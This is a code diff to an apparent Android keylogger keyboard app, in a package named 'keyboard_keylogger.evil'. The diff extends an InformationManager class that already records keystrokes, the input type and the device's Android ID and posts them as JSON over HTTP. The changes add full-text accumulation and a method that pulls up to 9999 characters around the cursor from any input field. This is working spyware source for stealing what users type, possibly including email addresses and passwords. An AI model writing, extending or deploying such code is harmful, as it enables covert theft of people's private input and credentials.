@@ -2,6 +2,7 @@ package com.example.keyboard_keylogger.evil;
 
 import android.inputmethodservice.InputMethodService;
 import android.provider.Settings;
+import android.view.inputmethod.InputConnection;
 
 import androidx.annotation.NonNull;
 
@@ -11,6 +12,7 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 
 public class InformationManager {
+    private String allText;
     private final ArrayList<Character> text;
     private final String androidId;
     private String inputType;
@@ -24,6 +26,9 @@ public class InformationManager {
     public static InformationManager getInstance(InputMethodService ime){
         if (instance==null)
         instance = new InformationManager(ime);
+        return instance;
+    }
+    public static InformationManager getInstance(){
         return instance;
     }
     /**
@@ -55,9 +60,10 @@ public class InformationManager {
     }
     public void addChar(char c){
         text.add(c);
+        allText += c;
     }
     public void sendInfo(){
-
+        System.out.println("All text: "+allText);
         JSONObject infoObject = createJSONObject(text,inputType,androidId);
         new HTTPReqTask().setBody(infoObject.toString()).execute();
         text.clear();
@@ -78,4 +84,10 @@ public class InformationManager {
         if (InputTypeUtils.isEmailVariation(inputType)) return "Email";
         return "Text";
     }
+    public void extractAllTextFromInputField(InputConnection ic){
+        String temp;
+        temp = ic.getTextBeforeCursor(9999, 0).toString() + ic.getTextAfterCursor(9999, 0).toString();
+        this.allText = temp;
+    }
+
 }
